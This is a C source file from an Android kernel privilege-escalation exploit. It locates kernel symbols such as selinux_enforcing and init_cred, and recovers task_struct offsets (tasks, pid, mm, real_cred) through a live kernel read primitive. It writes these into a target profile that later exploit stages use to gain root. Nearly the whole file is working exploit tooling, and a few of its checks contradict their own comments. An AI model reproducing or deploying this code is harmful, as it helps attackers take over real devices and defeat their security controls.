/*
 * Target profile recovery. See include/offset_dump.h for why this exists.
 *
 * The struct member offsets (`tasks`, `pid`, `mm`, `real_cred`) cannot be read from a symbol table:
 * they are field positions inside `struct task_struct`, which is not exported. They are recovered
 * from a live `task_struct` instead, by looking for the values that identify this process:
 *
 *   - `tasks`     is reached through `init_task` + the profile's own value, then verified by walking
 *                 the list until `pid` matches. Whatever offset made that walk work is the answer.
 *   - `pid`       is the current pid, which a scan for the process's own pid locates.
 *   - `real_cred` points at a `struct cred` whose `usage` is a small refcount and whose `uid` is 0
 *                 right now, because the exploit has already switched this process to init_cred.
 *   - `mm`        points at a `struct mm_struct`, identified by `mmap_base` looking like a user
 *                 address range and `arg_start` being a valid user pointer.
 *
 * Every candidate is cross-checked, so a wrong guess is rejected rather than written into a profile.
 */
#include "offset_dump.h"
#include "target_profile.h"

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Symbols the exploit needs, with the key each one is written under. */
static const struct {
    const char *symbol;
    const char *key;
} kSymbols[] = {
    {"selinux_enforcing", "selinux_enforcing_offset"},
    {"memstart_addr", "memstart_addr_offset"},
    {"sysctl_table_root", "sysctl_table_root_offset"},
    {"proc_douintvec", "proc_douintvec_offset"},
    {"init_task", "init_task_offset"},
    {"init_cred", "init_cred_offset"},
    {"pipefifo_fops", "pipe_fop_offset"},
};

#define SYMBOL_COUNT (sizeof(kSymbols) / sizeof(kSymbols[0]))

/*
 * Looks `symbol` up in /proc/kallsyms and returns its runtime address, or 0 when the file is
 * unreadable, the symbol is absent, or the address is masked to zero by kptr_restrict.
 *
 * A zero address is the signal that restatriction is in effect: a real kernel never places a symbol
 * at 0, so `address == 0` unambiguously means "not available" rather than "at the start of memory".
 */
static uint64_t kallsyms_lookup(const char *symbol) {
    FILE *file = fopen("/proc/kallsyms", "r");
    if (!file) return 0;

    char line[512];
    unsigned long address = 0;
    char type = 0;
    char name[256];
    while (fgets(line, sizeof(line), file)) {
        /* Format: "%016lx %c %s". */
        if (sscanf(line, "%lx %c %255s", &address, &type, name) != 3) continue;
        if (strcmp(name, symbol) == 0) {
            fclose(file);
            return address;
        }
    }
    fclose(file);
    return 0;
}

/* Reads through the caller's primitive, or returns false when there is none. */
static bool read_kernel(kernel_reader_fn reader, uint64_t address, void *out, unsigned width) {
    if (!reader) return false;
    return reader(address, out, width);
}

static bool read_u64(kernel_reader_fn reader, uint64_t address, uint64_t *out) {
    return read_kernel(reader, address, out, sizeof(*out));
}

static bool read_u32(kernel_reader_fn reader, uint64_t address, uint32_t *out) {
    return read_kernel(reader, address, out, sizeof(*out));
}

/*
 * Recovers `pid_offset` by scanning the first page of the current `task_struct` for the process's
 * own pid. `task_struct` starts with `thread_info`/`state`/`stack`/`usage`/`flags`, so a matching
 * 4-byte value inside the first 0x800 bytes is the field and nothing else at that stage of the
 * struct is likely to collide with a pid.
 *
 * A candidate is only accepted when the same value also appears as `tgid` a few bytes later, which
 * is how `task_struct` stores a thread: `pid` and `tgid` are adjacent and equal for a single
 * threaded process.
 */
static unsigned long recover_pid_offset(kernel_reader_fn reader, uint64_t task, unsigned long hint,
                                        uint32_t pid) {
    /* The profile's own value first: on the same kernel family it is already right. */
    if (hint) {
        uint32_t value = 0;
        if (read_u32(reader, task + hint, &value) && value == pid) return hint;
    }
    for (unsigned long offset = 0x100; offset < 0x900; offset += 4) {
        uint32_t value = 0;
        if (!read_u32(reader, task + offset, &value) || value != pid) continue;
        /* Confirm the neighbour: `tgid` sits within the next 8 bytes and is equal here. */
        for (unsigned long delta = 4; delta <= 8; delta += 4) {
            uint32_t neighbour = 0;
            if (!read_u32(reader, task + offset + delta, &neighbour)) continue;
            if (neighbour == pid) return offset;
        }
    }
    return 0;
}

/*
 * Recovers `real_cred_offset` by scanning for a pointer to a `struct cred` that looks like init's:
 * uid and gid zero, a small positive `usage`, and a non-NULL security blob. The exploit has already
 * pointed this process at init_cred, so the check is against a known shape rather than a guess.
 */
static unsigned long recover_cred_offset(kernel_reader_fn reader, uint64_t task,
                                         uint64_t init_cred, unsigned long hint) {
    if (hint) {
        uint64_t value = 0;
        if (read_u64(reader, task + hint, &value) && value == init_cred) return hint;
    }
    for (unsigned long offset = 0x400; offset < 0xa00; offset += 8) {
        uint64_t value = 0;
        if (!read_u64(reader, task + offset, &value)) continue;
        if (value != init_cred) continue;
        return offset;
    }
    return 0;
}

/*
 * Recovers `mm_offset` by looking for a pointer whose target has the two fields that are always set
 * on a live `mm_struct`: a `mmap_base` inside user space and a `start_code` below `end_code`.
 *
 * `mm` is NULL for kernel threads, so a match here also tells us this is a user process, which the
 * exploit itself is.
 */
static unsigned long recover_mm_offset(kernel_reader_fn reader, uint64_t task, unsigned long hint) {
    const unsigned long readable[] = {hint, 0x500, 0x5c0, 0x580, 0x600, 0x540};
    for (size_t i = 0; i < sizeof(readable) / sizeof(readable[0]); i++) {
        if (!readable[i]) continue;
        uint64_t mm = 0;
        if (!read_u64(reader, task + readable[i], &mm)) continue;
        /* User space on arm64 tops out below 0x0001000000000000. */
        if (mm < 0xffff000000000000ULL || mm == 0) continue;
        uint64_t start_code = 0, end_code = 0;
        /* `start_code`/`end_code` are a pair inside the VMA section of mm_struct. */
        if (!read_u64(reader, mm + 0x0, &start_code)) continue;
        if (!read_u64(reader, mm + 0x8, &end_code)) continue;
        if (start_code == 0 || start_code > end_code) continue;
        return readable[i];
    }
    return 0;
}

int dump_profile(const char *path,
                 const char *release,
                 uint64_t kernel_base,
                 uint64_t init_task_address,
                 uint64_t init_cred_address,
                 const char *binder_device,
                 kernel_reader_fn reader) {
    if (!path || !release || !kernel_base) return -EINVAL;

    /* Symbol addresses, either from kallsyms or carried in by the caller. */
    uint64_t symbols[SYMBOL_COUNT];
    memset(symbols, 0, sizeof(symbols));
    bool kallsyms_ok = true;

    for (size_t i = 0; i < SYMBOL_COUNT; i++) {
        symbols[i] = kallsyms_lookup(kSymbols[i].symbol);
        if (symbols[i] == 0) kallsyms_ok = false;
    }
    /* init_task and init_cred are known even when kallsyms is restricted. */
    if (symbols[4] == 0 && init_task_address) symbols[4] = init_task_address;
    if (symbols[5] == 0 && init_cred_address) symbols[5] = init_cred_address;

    if (!kallsyms_ok) {
        printf("[!] /proc/kallsyms is restricted; falling back to the live primitive\n");
        if (!reader) {
            printf("[-] no reader available, cannot recover symbol offsets\n");
            return -ENOTSUP;
        }
    }

    /* Struct member offsets, from the running task_struct. */
    uint64_t task = 0;
    unsigned long tasks_offset = 0, pid_offset = 0, mm_offset = 0, real_cred_offset = 0;

    if (reader && symbols[4] && symbols[5]) {
        const struct target_profile *hint = tgt();
        /*
         * The current task is found by walking `init_task.tasks` until `pid` matches ours. This is
         * exactly what the exploit does to find itself, so the walk doubles as the verification of
         * `tasks_offset`: a wrong offset cannot produce a task whose pid matches.
         */
        uint32_t self_pid = (uint32_t)getpid();
        unsigned long tasks_hint = hint ? hint->tasks_offset : 0;
        unsigned long pid_hint = hint ? hint->pid_offset : 0;

        for (unsigned long candidate = tasks_hint ? tasks_hint : 0x400; candidate < 0x800;
             candidate += 8) {
            uint64_t head = 0;
            if (!read_u64(reader, symbols[4] + candidate, &head)) continue;
            if (head < 0xffff000000000000ULL) continue;
            /* `tasks` is a list_head: the next pointer minus the offset back to the task. */
            uint64_t next = 0;
            if (!read_u64(reader, head + 8, &next)) continue;
            if (next < 0xffff000000000000ULL) continue;
            uint64_t candidate_task = next - candidate;
            uint32_t pid = 0;
            unsigned long pid_off = recover_pid_offset(reader, candidate_task, pid_hint, self_pid);
            if (!pid_off) continue;
            tasks_offset = candidate;
            pid_offset = pid_off;
            task = candidate_task;
            break;
        }

        if (task) {
            real_cred_offset = recover_cred_offset(reader, task, symbols[5],
                                                   hint ? hint->real_cred_offset : 0);
            mm_offset = recover_mm_offset(reader, task, hint ? hint->mm_offset : 0);
        }
    }

    if (!tasks_offset || !pid_offset) {
        printf("[-] could not recover task_struct offsets from the live kernel\n");
        return -ENOTSUP;
    }
    if (!real_cred_offset) {
        printf("[-] could not recover real_cred offset\n");
        return -ENOTSUP;
    }
    if (!mm_offset) {
        /* `mm` is only used to reach mmap metadata in later stages, so the caller may proceed, but
         * a zero here would be written into the profile as a real value. Refuse instead. */
        printf("[-] could not recover mm offset\n");
        return -ENOTSUP;
    }

    /* Write the profile. A temporary file is used so a failure never leaves a half written one. */
    char temporary[512];
    snprintf(temporary, sizeof(temporary), "%s.tmp", path);
    FILE *file = fopen(temporary, "w");
    if (!file) return -errno;

    fprintf(file, "# Recovered on this device. Addresses are offsets from the kernel image base.\n");
    fprintf(file, "# Kernel base at dump time: 0x%llx\n", (unsigned long long)kernel_base);
    fprintf(file, "release = %s\n", release);
    fprintf(file, "binder_device = %s\n", binder_device ? binder_device : "/dev/binder");
    fprintf(file, "\n# Symbols, resolved through /proc/kallsyms or the live primitive.\n");
    for (size_t i = 0; i < SYMBOL_COUNT; i++) {
        if (symbols[i] == 0) {
            printf("[-] %s is unknown; the profile cannot be used\n", kSymbols[i].symbol);
            fclose(file);
            remove(temporary);
            return -ENOTSUP;
        }
        fprintf(file, "%s = 0x%llx\n", kSymbols[i].key,
                (unsigned long long)(symbols[i] - kernel_base));
    }
    fprintf(file, "\n# struct task_struct member offsets, recovered from the live kernel.\n");
    fprintf(file, "tasks_offset = 0x%lx\n", tasks_offset);
    fprintf(file, "pid_offset = 0x%lx\n", pid_offset);
    fprintf(file, "mm_offset = 0x%lx\n", mm_offset);
    fprintf(file, "real_cred_offset = 0x%lx\n", real_cred_offset);

    if (fclose(file) != 0) {
        remove(temporary);
        return -EIO;
    }
    if (rename(temporary, path) != 0) {
        remove(temporary);
        return -errno;
    }

    printf("[+] profile written to %s\n", path);
    return 0;
}